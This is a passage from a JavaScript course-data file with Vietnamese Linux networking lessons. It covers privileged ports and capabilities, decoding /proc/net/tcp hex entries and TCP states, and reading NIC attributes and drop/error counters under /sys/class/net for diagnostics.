      reflectionHint: "Sự tiện dụng nhất thời là cái bẫy tâm lý: gõ 'sudo' giúp tiến trình chạy ngay mà không cần suy nghĩ xem Kernel đòi hỏi năng lực gì. Nhưng cái giá phải trả là toàn bộ bề mặt tấn công của hệ thống bị mở toang. Kỹ sư chuyên nghiệp luôn xây dựng thói quen hiểu rõ đặc quyền tối thiểu: chỉ cấp đúng chiếc thẻ từ cần dùng thay vì đưa cả chùm chìa khóa vạn năng.",
      summary: [
        "Ranh giới cổng đặc quyền < 1024 có nguồn gốc lịch sử từ thời BSD UNIX và vẫn được kiểm soát nghiêm ngặt trong Linux Kernel.",
        "Tuyệt đối không chạy ứng dụng mạng bằng quyền root toàn phần (sudo) vì nguy cơ chiếm quyền điều khiển hệ thống khi xảy ra lỗ hổng RCE.",
        "Linux Capabilities phân rã quyền root thành hơn 40 năng lực độc lập; CAP_NET_BIND_SERVICE là năng lực duy nhất cần thiết để bind cổng < 1024.",
        "Systemd Service cung cấp cơ chế AmbientCapabilities và BoundingSet kết hợp Sandbox hệ thống tệp (ProtectSystem, DynamicUser) chuẩn production.",
        "Quản lý vòng đời dịch vụ bằng Systemd giúp dịch vụ tự động hồi sinh khi gặp sự cố và truy vết nhật ký tập trung qua journalctl."
      ],
      nextLessonPreview: "Bài 0.3: Mổ xẻ Kernel qua /proc/net và /sys/class/net — Khám phá cách Kernel Linux công khai bảng trạng thái thô của Network Stack qua hệ thống file ảo, giải mã hex table /proc/net/tcp và các bộ đếm card mạng."
    },
    {
      id: "net-0-03",
      number: "0.3",
      title: "Mổ xẻ Kernel qua /proc/net và /sys/class/net",
      subtitle: "Khám phá bảng trạng thái thô của Network Stack: Giải mã /proc/net/tcp và chỉ số thống kê card mạng /sys/class/net",
      level: "Nền tảng",
      duration: "90 phút",
      objectives: [
        "Phân biệt bản chất và kiến trúc vận hành giữa hai hệ thống file ảo procfs (/proc) và sysfs (/sys) trong quản trị mạng Linux.",
        "Giải mã tường tận từng trường dữ liệu dạng mã Hex Little-Endian trong bảng /proc/net/tcp (địa chỉ IP, Port, TCP state enum, tx/rx queue, Inode).",
        "Đọc và kiểm soát các tham số phần cứng vật lý của card mạng qua /sys/class/net/<iface>/ (operstate, carrier, speed, duplex, MTU, address).",
        "Khai thác kho báu /sys/class/net/<iface>/statistics/ để phát hiện sớm các sự cố nghẽn mạng, lỗi CRC, rụng gói tin (rx_dropped, fifo errors).",
        "Tự xây dựng công cụ giám sát mạng độc lập (Zero-Dependency) bằng Shell Script đọc trực tiếp dữ liệu thô từ Kernel."
      ],
      intuition: {
        title: "Bảng Điều Khiển Trong Suốt & Đồng Hồ Áp Suất Của Cỗ Máy Kernel",
        metaphor: "Hãy tưởng tượng Linux Kernel như một cỗ máy động cơ phản lực siêu tốc đang đóng kín. Bạn không thể chui đầu vào bên trong buồng đốt khi nó đang quay hàng chục ngàn vòng/phút để đếm xem có bao nhiêu giọt nhiên liệu được phun vào. Thay vào đó, các kỹ sư thiết kế cỗ máy đã đục sẵn hai loại cửa sổ kỹ thuật đặc biệt ra vỏ ngoài:\n1. Cửa sổ /proc/net: Là bảng đồng hồ điện tử hiển thị trạng thái của các dòng chảy tức thời — mỗi kết nối TCP đang bay qua, cổng nào đang mở, áp suất bộ đệm hàng đợi (Rx/Tx buffer) là bao nhiêu.\n2. Cửa sổ /sys/class/net: Là bảng sơ đồ mạch phần cứng — cho biết cáp mạng có bị lỏng không (carrier), van tiết lưu cho phép kích thước gói tối đa là bao nhiêu (MTU), tốc độ truyền dẫn vật lý đạt 1Gbps hay 10Gbps (speed), và các bộ đếm số lượng vụn rác bị kẹt lại ở màng lọc (rx_dropped, fifo errors).\nMọi công cụ chẩn đoán như netstat, ip, ifconfig, hay ethtool thực chất chẳng có phép thuật nào cả — chúng chỉ đơn thuần là những người thợ cầm đèn pin soi vào hai cửa sổ này và chép lại các con số!",
        visualHtml: `<div class="net-arch-box">
            <div class="net-arch-header">
              <span class="net-arch-icon">🔍</span>
              <span class="net-arch-title">KIẾN TRÚC HAI CỬA SỔ VÀO KERNEL: PROCFS (TRẠNG THÁI RUNTIME) &amp; SYSFS (MÔ HÌNH THIẾT BỊ)</span>
            </div>
            <div class="net-arch-layers">
              <div class="net-arch-layer layer-userspace">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">👤 Không Gian Người Dùng (User Space — CLI, Scripts, Container)</span>
                  <span class="net-arch-layer-badge">Ring 3 (Unprivileged / Monitoring)</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Công cụ CLI Cấp Cao:</strong> <code>ss</code>, <code>ip link</code>, <code>ethtool</code>, <code>netstat</code> (đều thu thập từ procfs/sysfs hoặc netlink)</div>
                  <div class="net-arch-node"><strong>Debug Tối Giản:</strong> <code>cat /proc/net/tcp</code>, <code>cat /sys/class/net/eth0/speed</code>, shell script zero-dependency</div>
                  <div class="net-arch-node"><strong>Hệ Thống Giám Sát:</strong> Prometheus Node Exporter, Datadog Agent, Grafana Agent</div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Truy cập qua Virtual File System (VFS Pseudo Filesystem) trong RAM</div>

              <div class="net-arch-layer layer-vfs">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">📁 Hai Hệ Thống Tệp Ảo: procfs (/proc) &amp; sysfs (/sys)</span>
                  <span class="net-arch-layer-badge">VFS Layer (RAM Only)</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>/proc/net/ (procfs):</strong> Bảng trạng thái động mạng — <code>tcp</code>, <code>udp</code>, <code>raw</code>, <code>dev</code> (thống kê interface), <code>sockstat</code> (tổng quan socket)</div>
                  <div class="net-arch-node"><strong>/sys/class/net/ (sysfs):</strong> Cây phân cấp thiết bị &amp; Driver — <code>operstate</code>, <code>carrier</code>, <code>speed</code>, <code>duplex</code>, <code>mtu</code>, <code>statistics/</code></div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Ánh xạ trực tiếp từ Cấu trúc Dữ liệu Nhân Linux (Kernel Network Subsystem)</div>

              <div class="net-arch-layer layer-netstack">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">🧠 Linux Kernel Core (Network Stack &amp; Device Infrastructure)</span>
                  <span class="net-arch-layer-badge">Kernel Space (Ring 0)</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>TCP Hash Table (tcp_hashinfo):</strong> Danh sách liên kết các <code>struct sock</code>, lưu trạng thái TCP FSM (11 States), Inode ID</div>
                  <div class="net-arch-node"><strong>Network Device Struct (struct net_device):</strong> Quản lý tham số driver, địa chỉ MAC, hàng đợi DMA Multi-Queue (RSS)</div>
                  <div class="net-arch-node"><strong>Bộ Đếm Phần Cứng (net_device_stats):</strong> <code>rx_bytes</code>, <code>tx_bytes</code>, <code>rx_dropped</code>, <code>rx_fifo_errors</code></div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Trình điều khiển Card Mạng (NIC Driver &amp; DMA Hardware Queues)</div>

              <div class="net-arch-layer layer-hardware">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">⚡ Phần Cứng Card Mạng Vật Lý (NIC / PHY / Cable Link)</span>
                  <span class="net-arch-layer-badge">L1 &amp; L2 Hardware</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Bộ Đệm DMA Vòng:</strong> Rx/Tx Ring Buffer (kích thước thường từ 512 đến 4096 descriptors)</div>
                  <div class="net-arch-node"><strong>Tín Hiệu Vật Lý:</strong> Cảm biến cáp mạng (Carrier Detect 0/1), Cơ chế tự thương lượng (Auto-Negotiation: Speed &amp; Duplex)</div>
                </div>
              </div>
            </div>
          </div>`
      },
      sections: [
        {
          id: "sec-problem",
          title: "Vấn đề thực tế: Khi công cụ chẩn đoán biến mất & Nhu cầu nhìn thẳng vào Kernel",
          content: `<p>Trong kỷ nguyên điện toán đám mây và Container hóa (Docker, Kubernetes), xu hướng kiến trúc hiện đại luôn ưu tiên tạo ra các Container Image siêu nhẹ (Minimal Container Images) xây dựng trên nền tảng <strong>Distroless</strong> hoặc <strong>Alpine Linux rút gọn</strong>. Mục đích nhằm thu nhỏ dung lượng tải xuống (chỉ từ 5MB - 30MB) và triệt tiêu tối đa các lỗ hổng an ninh tiềm ẩn (CVE).</p>
        <p>Thế nhưng, chính lợi thế bảo mật này lại trở thành một <em>cơn ác mộng kinh hoàng</em> cho các kỹ sư DevOps/SRE khi sự cố mạng bất ngờ ập đến trên môi trường Production:</p>
        <p>Bạn dùng lệnh <code>kubectl exec -it &lt;pod-name&gt; -- sh</code> nhảy vào bên trong một Pod đang bị mất kết nối và gõ các lệnh quen thuộc:</p>
        <pre class="code-pre"><code>/ # netstat -tulpn
sh: netstat: not found
/ # ss -tulpn
sh: ss: not found
/ # ip a
sh: ip: not found
/ # lsof -i :8080
sh: lsof: not found
/ # curl http://localhost:8080
sh: curl: not found</code></pre>
        <p>Trong container không có quyền <code>root</code>, không có mạng ra Internet để chạy lệnh <code>apk add</code> hay <code>apt-get install</code>. Chẳng lẽ chúng ta hoàn toàn bó tay chấp nhận "mù thông tin" và phó mặc số phận hệ thống?</p>
        <p><strong>Câu trả lời là KHÔNG!</strong> Một kỹ sư Linux bậc thầy luôn nhớ rằng: <em>Bất kể Container có tối giản đến mức nào, nó vẫn đang chia sẻ chung Linux Kernel với máy chủ vật lý, và Kernel luôn luôn mở hai cửa sổ thông tin vô giá vào không gian người dùng: <code>/proc</code> và <code>/sys</code></em>.</p>

        <p><strong>Bản chất phân nhánh giữa <code>procfs</code> (/proc) và <code>sysfs</code> (/sys):</strong></p>
        <ul>
          <li><strong><code>procfs</code> (/proc - Process Filesystem):</strong> Xuất hiện lần đầu từ Unix thế hệ 8 tại phòng thí nghiệm Bell Labs. Ban đầu nó chỉ dùng để mô hình hóa trạng thái các tiến trình (PID). Theo thời gian phát triển của Linux, các lập trình viên bắt đầu "nhét" thêm rất nhiều bảng thông tin runtime của Kernel vào đây, bao gồm toàn bộ Network Stack dưới thư mục <code>/proc/net/</code>. Nhược điểm của <code>/proc</code> là cấu trúc hỗn độn, không có quy chuẩn phân cấp phần cứng rõ ràng.</li>
          <li><strong><code>sysfs</code> (/sys - System Filesystem):</strong> Được kiến trúc sư huyền thoại Greg Kroah-Hartman và Pat Mochel giới thiệu vào năm 2003 trong nhân Linux 2.6. Nó chuẩn hóa một cây thư mục phân cấp thống nhất (Unified Device Model) dựa trên cấu trúc đối tượng <code>kobject</code>. Nhờ đó, lớp thiết bị mạng được đặt ngay ngắn tại <code>/sys/class/net/</code>, cung cấp các thông số vật lý chuẩn xác của từng Card mạng (NIC).</li>
        </ul>

        <div class="net-topo-box">
          <div class="net-topo-title">💡 MỐI LIÊN HỆ ĐẶC BIỆT: /proc/net LÀ SYMLINK ĐA NAMESPACE</div>
          <p>Nếu bạn thực hiện lệnh <code>ls -l /proc/net</code> trên bất kỳ máy Linux nào, bạn sẽ thấy nó là một Symbolic Link trỏ thẳng về: <code>/proc/self/net</code>!</p>
          <p>Điều này có ý nghĩa gì? <code>self</code> đại diện cho chính tiến trình đang đọc file. Khi một container hoạt động trong một <strong>Network Namespace</strong> riêng biệt (như container của Docker hay Pod Kubernetes), việc đọc <code>/proc/net</code> sẽ tự động ánh xạ tới bảng mạng của chính namespace đó, đảm bảo tính cô lập hoàn hảo giữa các container trên cùng máy chủ!</p>
        </div>`
        },
        {
          id: "sec-mechanism",
          title: "Cơ chế kỹ thuật: Giải mã Bảng Hex /proc/net/tcp & 11 Trạng thái TCP",
          content: `<p>Khi một tiến trình mạng mở một cổng lắng nghe hoặc thiết lập kết nối TCP, Kernel lập tức ghi lại trạng thái này vào bảng băm socket (Socket Hash Table) trong RAM. Bảng dữ liệu này được Kernel công khai nguyên bản cho người dùng qua tệp ảo <code>/proc/net/tcp</code> (hoặc <code>/proc/net/tcp6</code> cho IPv6).</p>
        <p>Dưới đây là một dòng dữ liệu thực tế trích xuất trực tiếp từ <code>cat /proc/net/tcp</code>:</p>

        <div class="net-log-terminal" style="font-size:0.78rem;overflow-x:auto;white-space:pre;">  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 312048 1 0000000000000000 100 0 0 10 0</div>

        <p>Đối với người chưa học, dòng chữ này trông giống như một chuỗi ký tự ma trận vô nghĩa. Nhưng đối với một kỹ sư hiểu kiến trúc máy tính, từng ký tự đều phản ánh chính xác cấu trúc dữ liệu bên trong Kernel C code:</p>

        <div class="net-matrix-table-wrap">
          <table class="net-matrix-table">
            <thead>
              <tr>
                <th>Tên cột</th>
                <th>Giá trị trong ví dụ</th>
                <th>Ý nghĩa kỹ thuật tầng sâu</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><code>sl</code></td>
                <td><code>0</code></td>
                <td><strong>Slot Index:</strong> Chỉ số vị trí bucket trong bảng băm socket nội bộ (Hash table index) của nhân Linux.</td>
              </tr>
              <tr>
                <td><code>local_address</code></td>
                <td class="net-highlight-cell">0100007F:1F90</td>
                <td>Địa chỉ IP và Cổng cục bộ của Socket được mã hóa theo hệ thập lục phân (Hex).</td>
              </tr>
              <tr>
                <td><code>rem_address</code></td>
                <td>00000000:0000</td>
                <td>Địa chỉ IP và Cổng của máy chủ từ xa (Remote Peer). Giá trị toàn số 0 nghĩa là socket chưa nối tới ai (đang nghe mọi nơi).</td>
              </tr>
              <tr>
                <td><code>st</code></td>
                <td class="net-highlight-cell">0A</td>
                <td><strong>State Enum:</strong> Trạng thái kết nối TCP nội bộ của Kernel dạng Hex (0A hex = 10 dec tương ứng với <code>TCP_LISTEN</code>).</td>
              </tr>
              <tr>
                <td><code>tx_queue:rx_queue</code></td>
                <td>00000000:00000000</td>
                <td>Dung lượng byte hiện có trong bộ đệm gửi (chưa ACK) và bộ đệm nhận (chưa được ứng dụng gọi hàm <code>read()</code>).</td>
              </tr>
              <tr>
                <td><code>tr:tm->when</code></td>
                <td>00:00000000</td>
                <td>Bộ đếm thời gian (Timer) đang kích hoạt: 00 = Không có timer, 01 = Retransmit timer, 02 = Keepalive timer, 03 = TIME_WAIT timer.</td>
              </tr>
              <tr>
                <td><code>retrnsmt</code></td>
                <td>00000000</td>
                <td>Số lần truyền lại gói tin (TCP Retransmissions) không thành công của kết nối hiện tại.</td>
              </tr>
              <tr>
                <td><code>uid</code></td>
                <td>1000</td>
                <td>Mã User ID của tài khoản hệ thống đã tạo và sở hữu Socket này (UID 1000 là tài khoản người dùng thông thường).</td>
              </tr>
              <tr>
                <td><code>inode</code></td>
                <td class="net-highlight-cell">312048</td>
                <td><strong>Socket Inode Number:</strong> Số định danh Inode ảo trên phân vùng RAM <code>sockfs</code>. <em>Con số này khớp 100% với liên kết Inode trong <code>/proc/&lt;PID&gt;/fd/</code> từ Bài 0.1!</em></td>
              </tr>
            </tbody>
          </table>
        </div>

        <h3 style="margin-top:24px;color:var(--topic-network);">Giải phẫu Thuật toán Hex Little-Endian: Tại sao 0100007F là 127.0.0.1?</h3>
        <p>Một câu hỏi tự nhiên xuất hiện: Địa chỉ Loopback nổi tiếng là <code>127.0.0.1</code>. Tại sao trong bảng hex lại được viết là <code>0100007F</code> thay vì <code>7F000001</code>?</p>
        <p>Căn nguyên nằm ở sự đối lập giữa hai chuẩn lưu trữ dữ liệu trong khoa học máy tính:</p>
        <ul>
          <li><strong>Network Byte Order (Big-Endian):</strong> Chuẩn giao thức Internet quy định byte có trọng số cao nhất (Most Significant Byte - MSB) phải được gửi đi trước trên sợi cáp. Theo chuẩn này, <code>127.0.0.1</code> tương ứng với dãy byte: <code>7F . 00 . 00 . 01</code>.</li>
          <li><strong>Host Byte Order (Little-Endian trên vi xử lý x86/x64):</strong> Các CPU của Intel và AMD tổ chức bộ nhớ theo quy tắc Little-Endian: byte có trọng số thấp nhất (LSB) nằm ở địa chỉ ô nhớ thấp nhất. Khi một số nguyên 32-bit (IPv4) được lưu trữ trong thanh ghi CPU, byte <code>01</code> được đặt ở đầu tiên, tiếp theo là <code>00</code>, <code>00</code>, và cuối cùng là <code>7F</code>.</li>
        </ul>
        <p>Khi Kernel Linux in chuỗi ký tự ra file <code>/proc/net/tcp</code>, nó dùng định dạng chuỗi đơn giản: <code>sprintf(..., "%08X:%04X", ip, port)</code>. Vì biến <code>ip</code> là số nguyên 32-bit trong bộ nhớ Little-Endian, các ký tự được in thẳng ra màn hình theo thứ tự byte từ thấp đến cao: <strong><code>01 00 00 7F</code></strong>!</p>

        <div class="net-topo-box">
          <div class="net-topo-title">📐 CÔNG THỨC 3 BƯỚC GIẢI MÃ NHANH HEX LITTLE-ENDIAN SANG IP:PORT</div>
          <ol style="margin:0;padding-left:20px;line-height:1.7;">
            <li><strong>Tách thành 4 cặp Hex:</strong> Cụm <code>0100007F</code> được chia thành 4 byte: <code>[01]</code> <code>[00]</code> <code>[00]</code> <code>[7F]</code>.</li>
            <li><strong>Đảo ngược thứ tự 4 byte:</strong> Đảo ngược vị trí để chuyển từ Host sang Network order: <code>[7F]</code> <code>[00]</code> <code>[00]</code> <code>[01]</code>.</li>
            <li><strong>Chuyển Hex sang Decimal:</strong>
              <ul style="margin:4px 0 6px 16px;">
                <li><code>0x7F</code> = 127</li>
                <li><code>0x00</code> = 0</li>
                <li><code>0x00</code> = 0</li>
                <li><code>0x01</code> = 1</li>
                <li>➔ Cho ra kết quả tuyệt đối: <strong>127.0.0.1</strong>!</li>
              </ul>
            </li>
            <li><strong>Giải mã Cổng (Port):</strong> Cụm port <code>1F90</code> là số nguyên 16-bit được lưu theo Network Order, chỉ cần đổi trực tiếp từ Hex sang Dec:
              <br><code>0x1F90 = (1 × 16³) + (15 × 16²) + (9 × 16¹) + (0 × 16⁰) = 4096 + 3840 + 144 + 0 = </code><strong>8080</strong>!
            </li>
          </ol>
        </div>

        <h3 style="margin-top:24px;color:var(--topic-network);">Bảng Ma Trận 11 Trạng Thái TCP FSM của Linux Kernel</h3>
        <p>Cột <code>st</code> trong bảng <code>/proc/net/tcp</code> đại diện cho trạng thái hiện thời của máy trạng thái hữu hạn TCP (Finite State Machine). Hãy lưu bảng đối chiếu toàn diện này vào sổ tay kỹ sư của bạn:</p>

        <div class="net-matrix-table-wrap">
          <table class="net-matrix-table">
            <thead>
              <tr>
                <th>Mã Hex (st)</th>
                <th>Giá trị Dec</th>
                <th>Hằng số Kernel C (include/net/tcp_states.h)</th>
                <th>Tên trạng thái chuẩn</th>
                <th>Ý nghĩa vận hành trong hệ thống</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td class="net-highlight-cell">01</td>
                <td>1</td>
                <td><code>TCP_ESTABLISHED</code></td>
                <td>ESTABLISHED</td>
                <td>Bắt tay 3 bước hoàn tất, kết nối hoạt động bình thường, dữ liệu hai chiều đang truyền nhận.</td>
              </tr>
              <tr>
                <td>02</td>
                <td>2</td>
                <td><code>TCP_SYN_SENT</code></td>
                <td>SYN-SENT</td>
                <td>Phía ta vừa gửi gói tin SYN đi, đang sốt ruột chờ phản hồi SYN-ACK từ máy chủ từ xa.</td>
              </tr>
              <tr>
                <td>03</td>
                <td>3</td>
                <td><code>TCP_SYN_RECV</code></td>
                <td>SYN-RECV</td>
                <td>Đã nhận gói SYN từ client và gửi lại SYN-ACK, đang chờ gói ACK cuối cùng (nếu kẹt ở đây là dấu hiệu SYN Flood!).</td>
              </tr>
              <tr>
                <td>04</td>
                <td>4</td>
                <td><code>TCP_FIN_WAIT1</code></td>
                <td>FIN-WAIT-1</td>
                <td>Ứng dụng ta chủ động đóng kết nối (gọi <code>close()</code>), Kernel đã gửi cờ FIN và đang chờ phía kia ACK.</td>
              </tr>
              <tr>
                <td>05</td>
                <td>5</td>
                <td><code>TCP_FIN_WAIT2</code></td>
                <td>FIN-WAIT-2</td>
                <td>Phía kia đã ACK gói FIN của ta, nhưng họ chưa sẵn sàng đóng, ta đang chờ họ gửi FIN của riêng họ.</td>
              </tr>
              <tr>
                <td>06</td>
                <td>6</td>
                <td><code>TCP_TIME_WAIT</code></td>
                <td>TIME-WAIT</td>
                <td>Kết nối đã đóng thành công! Kernel giữ socket ở trạng thái này trong thời gian 2MSL (60s) để tránh gói tin lạc.</td>
              </tr>
              <tr>
                <td>07</td>
                <td>7</td>
                <td><code>TCP_CLOSE</code></td>
                <td>CLOSE</td>
                <td>Socket đã hoàn toàn đóng và cấu trúc dữ liệu chuẩn bị được Kernel thu hồi dọn dẹp.</td>
              </tr>
              <tr>
                <td>08</td>
                <td>8</td>
                <td><code>TCP_CLOSE_WAIT</code></td>
                <td>CLOSE-WAIT</td>
                <td>Đầu xa đã đóng kết nối, Kernel ta đã ACK, nhưng ứng dụng của ta <em>chưa gọi hàm close()</em> (kẹt ở đây là lỗi Application Leak!).</td>
              </tr>
              <tr>
                <td>09</td>
                <td>9</td>
                <td><code>TCP_LAST_ACK</code></td>
                <td>LAST-ACK</td>
                <td>Ứng dụng ta đã gọi <code>close()</code> sau khi nhận FIN, đang chờ gói ACK cuối cùng để giải phóng.</td>
              </tr>
              <tr>
                <td class="net-highlight-cell">0A</td>
                <td>10</td>
                <td><code>TCP_LISTEN</code></td>
                <td>LISTEN</td>
                <td>Cổng dịch vụ đang mở, socket ở chế độ thụ động sẵn sàng đón nhận các yêu cầu kết nối mới từ khách hàng.</td>
              </tr>
              <tr>
                <td>0B</td>
                <td>11</td>
                <td><code>TCP_CLOSING</code></td>
                <td>CLOSING</td>
                <td>Trường hợp hy hữu: Cả hai bên cùng gửi gói FIN đồng thời (Simultaneous Close).</td>
              </tr>
            </tbody>
          </table>
        </div>`
        },
        {
          id: "sec-sysfs",
          title: "Mổ xẻ /sys/class/net: Lăng kính Phần cứng, Cáp mạng & Hàng đợi",
          content: `<p>Nếu <code>/proc/net</code> cho bạn biết về trạng thái kết nối phần mềm tầng cao, thì <strong><code>/sys/class/net/</code></strong> chính là chiếc kính hiển vi soi thẳng vào vi mạch phần cứng của Card mạng vật lý (NIC) và các thông số vận hành của tầng liên kết dữ liệu (Data Link Layer L2).</p>
        <p>Mỗi giao diện mạng trên máy (ví dụ: <code>eth0</code>, <code>enp3s0</code>, <code>wlan0</code>, <code>lo</code>) đều sở hữu một thư mục riêng biệt tại <code>/sys/class/net/&lt;interface&gt;/</code>. Mỗi tệp con bên trong tương ứng với một thuộc tính cấu hình trực tiếp:</p>

        <div class="net-matrix-table-wrap">
          <table class="net-matrix-table">
            <thead>
              <tr>
                <th>Tệp thuộc tính trong /sys/class/net/&lt;iface&gt;/</th>
                <th>Giá trị mẫu</th>
                <th>Ý nghĩa kỹ thuật &amp; Điểm lưu ý thực chiến</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><code>operstate</code></td>
                <td class="net-highlight-cell">up</td>
                <td><strong>Operational State:</strong> Trạng thái hoạt động vận hành của interface (<code>up</code>, <code>down</code>, <code>dormant</code>, <code>unknown</code>).<br><em>Bẫy kinh điển:</em> Lệnh <code>ip link set eth0 up</code> chỉ bật cờ quản trị (Administrative Flag), nhưng nếu dây mạng bị tuột thì <code>operstate</code> vẫn sẽ báo <code>down</code>!</td>
              </tr>
              <tr>
                <td><code>carrier</code></td>
                <td class="net-highlight-cell">1</td>
                <td><strong>Physical Link Detection:</strong> Tín hiệu vật lý của cáp mạng.<br><code>1</code>: Cáp đã cắm chặt, vi mạch PHY bắt tay thành công với switch.<br><code>0</code>: Mất tín hiệu vật lý! Cáp bị rút, đứt ngầm, hoặc cổng switch bị tắt.<br><strong>Mẹo tốc độ:</strong> Đọc tệp này mất 0.1 mili-giây, nhanh hơn hàng ngàn lần so với việc chờ lệnh ping bị timeout!</td>
              </tr>
              <tr>
                <td><code>speed</code></td>
                <td>1000</td>
                <td><strong>Băng thông danh định (Mbps):</strong> <code>1000</code> tương ứng với 1 Gbps, <code>10000</code> tương ứng với 10 Gbps quang. Giá trị báo <code>-1</code> nếu interface đang down hoặc là card ảo loopback.</td>
              </tr>
              <tr>
                <td><code>duplex</code></td>
                <td>full</td>
                <td><strong>Chế độ truyền song công:</strong> <code>full</code> (Full-Duplex: vừa gửi vừa nhận đồng thời) hoặc <code>half</code> (Half-Duplex: chỉ gửi hoặc nhận tại một thời điểm).<br>Nếu một bên Full mà bên kia Half (Duplex Mismatch do Auto-Negotiation lỗi), mạng sẽ sinh ra hàng triệu lỗi xung đột (Collisions) làm tốc độ giảm 90%!</td>
              </tr>
              <tr>
                <td><code>mtu</code></td>
                <td>1500</td>
                <td><strong>Maximum Transmission Unit:</strong> Kích thước gói tin IP tối đa (tính bằng byte) không cần phân mảnh.<br>Mặc định Ethernet là 1500 byte. Các máy chủ Datacenter/Storage thường chỉnh lên 9000 byte (Jumbo Frame) để tăng tốc độ sao lưu và giảm tải ngắt CPU.</td>
              </tr>
              <tr>
                <td><code>address</code></td>
                <td>52:54:00:8a:bc:11</td>
                <td><strong>Địa chỉ MAC phần cứng:</strong> 48-bit định danh duy nhất của Card mạng ở tầng L2 do nhà sản xuất (hoặc Hypervisor) cấp phát.</td>
              </tr>
              <tr>
                <td><code>queues/</code></td>
                <td>(Thư mục con)</td>
                <td>Chứa danh sách hàng đợi DMA đa luồng: <code>rx-0</code>, <code>rx-1</code>, <code>tx-0</code>, <code>tx-1</code>... Cho phép card mạng phân tán gói tin cho nhiều nhân CPU xử lý song song thông qua kỹ thuật RSS (Receive Side Scaling).</td>
              </tr>
            </tbody>
          </table>
        </div>`
        },
        {
          id: "sec-statistics",
          title: "Kho báu /sys/.../statistics & /proc/net/dev: Giám sát Drop/Error cấp Vi mạch",
          content: `<p>Bạn có bao giờ tự hỏi: Các phần mềm giám sát hạ tầng hàng đầu thế giới như Prometheus Node Exporter, Datadog Agent hay lệnh <code>ip -s link</code> lấy các con số thống kê lưu lượng mạng từ đâu? Chúng không tự phát minh ra con số; chúng đều đọc trực tiếp từ thư mục: <strong><code>/sys/class/net/&lt;interface&gt;/statistics/</code></strong>!</p>

        <p>Bên trong thư mục này chứa hàng chục bộ đếm số nguyên 64-bit được Kernel và Driver Card mạng cộng dồn liên tục theo thời gian thực:</p>
        <ul>
          <li><code>rx_bytes</code> và <code>tx_bytes</code>: Tổng số byte dữ liệu mà card mạng đã nhận (Rx) và gửi (Tx) kể từ khi hệ thống khởi động. <em>Lấy hiệu số giữa hai lần đọc cách nhau 1 giây chính là tốc độ mạng tức thời (Bytes/giây) của máy chủ!</em></li>
          <li><code>rx_packets</code> và <code>tx_packets</code>: Tổng số gói tin (khung mạng L2) đã truyền qua card mạng.</li>
          <li><code>rx_errors</code> và <code>tx_errors</code>: Tổng số gói tin bị lỗi tính toàn vẹn (sai mã kiểm tra lỗi CRC/FCS) do đường truyền vật lý bị nhiễu điện từ hoặc đầu bấm dây mạng bị oxy hóa.</li>
          <li><strong style="color:var(--danger);">rx_dropped: Con số tử huyệt của hệ thống mạng!</strong>
            <p>Đây là chỉ số quan trọng bậc nhất mà mọi kỹ sư SRE phải canh giữ. <code>rx_dropped</code> ghi nhận các gói tin <strong>hoàn toàn hợp lệ, không hề có lỗi bit</strong>, nhưng khi đến máy chủ thì bị Kernel hoặc Card mạng vứt thẳng vào sọt rác!</p>
            <p>Tại sao Kernel lại vứt bỏ gói tin hợp lệ? Có 3 thủ phạm chính:</p>
            <ol>
              <li><strong>Tràn bộ đệm nhận phần cứng (NIC Rx Ring Buffer Overrun):</strong> Gói tin ập đến quá nhanh trong các đợt lưu lượng tăng đột biến (Micro-burst), bộ đệm DMA vòng của card mạng bị đầy trước khi CPU kịp dọn dẹp.</li>
              <li><strong>Tràn hàng đợi backlog của Kernel:</strong> Hàng đợi đầu vào của nhân hệ điều hành (tham số <code>net.core.netdev_max_backlog</code>) bị chạm ngưỡng tối đa.</li>
              <li><strong>CPU quá tải ngắt mềm (SoftIRQ Starvation):</strong> Nhân CPU phụ trách xử lý gói tin bị chiếm dụng 100% tài nguyên, khiến hệ thống không còn chu kỳ CPU nào để nhấc gói tin ra khỏi card mạng!</li>
            </ol>
          </li>
          <li><strong style="color:var(--danger);">rx_fifo_errors:</strong> Bộ đệm FIFO phần cứng (First-In, First-Out) tích hợp ngay trên con chip silicon của NIC bị tràn trước khi kịp truyền dữ liệu qua khe cắm PCIe vào bộ nhớ RAM. Nếu số này lớn hơn 0, đó là lời cảnh báo đanh thép: máy chủ đang bị nghẽn cổ chai phần cứng nghiêm trọng.</li>
        </ul>

        <h3 style="margin-top:24px;color:var(--topic-network);">Bảng Tổng Hợp Siêu Tốc: /proc/net/dev</h3>
        <p>Nếu bạn muốn xem thống kê của toàn bộ 10 card mạng trên máy cùng một lúc mà không cần phải mở từng tệp con trong thư mục <code>statistics/</code>, hãy đọc tệp: <strong><code>/proc/net/dev</code></strong>:</p>

        <div class="net-log-terminal" style="font-size:0.75rem;overflow-x:auto;white-space:pre;">Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    lo: 4892102   12045    0    0    0     0          0         0  4892102   12045    0    0    0     0       0          0
  eth0: 9548120   64210    0    0    0     0          0         0  3142980   41029    0    0    0     0       0          0</div>

        <p>Chỉ với một lời gọi hệ thống đọc tệp <code>/proc/net/dev</code>, chương trình của bạn có thể thu thập trọn vẹn 16 chỉ số vận hành quan trọng của tất cả card mạng trong một phần triệu giây!</p>`
        },
        {
          id: "sec-observe",
          title: "Quan sát trên Linux: Thực thi lệnh và Phân tích từng dòng Output",
          content: `<p>Hãy cùng mở terminal và thực hành khám phá trực tiếp hai cửa sổ kỳ diệu này bằng các công cụ dòng lệnh thuần túy có sẵn trên mọi máy Linux:</p>`,
